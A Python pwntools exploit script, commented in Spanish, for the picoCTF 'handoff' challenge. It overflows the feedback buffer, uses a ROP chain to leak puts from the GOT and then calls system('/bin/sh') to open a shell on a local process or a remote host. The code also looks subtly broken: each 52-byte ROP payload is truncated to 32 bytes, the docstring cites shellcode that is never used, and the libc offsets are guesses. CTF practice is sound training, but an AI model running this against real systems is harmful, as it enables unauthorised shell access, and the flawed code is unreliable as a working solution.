#!/usr/bin/env python3
"""
Exploit para picoCTF handoff challenge

Vulnerabilidad: Buffer overflow en feedback (opción 3)
- fgets lee 32 bytes en buffer de 8 bytes
- Sobrescribe return address

Protecciones:
- No PIE: direcciones fijas
- No Canary: podemos sobrescribir ret
- Stack ejecutable: shellcode funciona
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Configuración
EXE = './handoff'
elf = ELF(EXE, checksec=False)

def get_io(remote_info=None):
    if remote_info:
        host, port = remote_info
        return remote(host, int(port))
    else:
        return process(EXE)

def exploit(io):
    """
    Estrategia principal: ret2libc con leak
    
    Paso 1: Leak dirección de libc usando puts@plt
    Paso 2: Calcular base de libc
    Paso 3: Llamar a system("/bin/sh")
    """
    
    # Gadgets y direcciones
    pop_rdi = 0x4014b3  # pop rdi; ret
    puts_plt = 0x4010a0
    puts_got = 0x404018
    vuln_addr = 0x401229
    
    log.info("=== FASE 1: LEAK DE LIBC ===")
    
    # Agregar una entrada dummy
    io.sendlineafter(b'Exit the app', b'1')
    io.sendlineafter(b'name:', b'dummy')
    
    # Construir ROP chain para leak
    # Payload: 8 bytes (feedback) + 4 bytes (total_entries) + 8 bytes (saved rbp) + ROP
    payload1 = flat({
        0: b'A' * 8,           # feedback[8]
        8: p32(0xdeadbeef),    # total_entries (no importa)
        12: b'B' * 8,          # saved rbp
        20: [
            pop_rdi,           # pop rdi; ret
            puts_got,          # rdi = dirección de puts en GOT
            puts_plt,          # llamar puts(puts_got) -> imprime dirección real de puts
            vuln_addr,         # retornar a vuln() para segundo round
        ]
    }, filler=b'\x00')
    
    # Enviar payload
    io.sendlineafter(b'Exit the app', b'3')
    io.sendlineafter(b'appreciate it:', payload1[:32])  # Solo 32 bytes
    
    # Recibir leak de puts
    try:
        io.recvuntil(b'appreciate it:')  # Saltar el input echo
        leak_data = io.recvline()
        
        # Extraer dirección (primeros 6 bytes generalmente)
        if len(leak_data) >= 6:
            puts_addr = u64(leak_data[:6].ljust(8, b'\x00'))
            log.success(f"Leaked puts@libc: {hex(puts_addr)}")
            
            # Calcular base de libc
            # Nota: Esto depende de la versión de libc
            # Primero necesito identificar la versión
            
            # Offsets comunes de puts en libc:
            # libc6_2.31: puts @ 0x809c0
            # libc6_2.35: puts @ 0x80ed0
            
            # Intentar con offset común
            puts_offset = 0x80ed0  # Ajustar según servidor
            libc_base = puts_addr - puts_offset
            system_offset = 0x50d60  # Offset común de system
            binsh_offset = 0x1d8678  # Offset común de "/bin/sh"
            
            system_addr = libc_base + system_offset
            binsh_addr = libc_base + binsh_offset
            
            log.info(f"Libc base: {hex(libc_base)}")
            log.info(f"system: {hex(system_addr)}")
            log.info(f"/bin/sh: {hex(binsh_addr)}")
            
            log.info("=== FASE 2: LLAMAR A SYSTEM ===")
            
            # Agregar otra entrada dummy
            io.sendlineafter(b'Exit the app', b'1')
            io.sendlineafter(b'name:', b'dummy2')
            
            # ROP chain final: system("/bin/sh")
            payload2 = flat({
                0: b'C' * 8,
                8: p32(0xdeadbeef),
                12: b'D' * 8,
                20: [
                    pop_rdi,
                    binsh_addr,
                    system_addr,
                ]
            }, filler=b'\x00')
            
            io.sendlineafter(b'Exit the app', b'3')
            io.sendlineafter(b'appreciate it:', payload2[:32])
            
            # ¡Shell!
            io.interactive()
            return True
            
    except Exception as e:
        log.error(f"Error en leak: {e}")
        return False
    
    return False

def main():
    import sys
    
    if len(sys.argv) >= 3:
        # Modo remoto
        host = sys.argv[1]
        port = sys.argv[2]
        log.info(f"Conectando a {host}:{port}")
        io = get_io((host, port))
    else:
        # Modo local
        log.info("Ejecutando localmente")
        io = get_io()
    
    try:
        exploit(io)
    except Exception as e:
        log.error(f"Exploit falló: {e}")
        io.close()

if __name__ == '__main__':
    main()
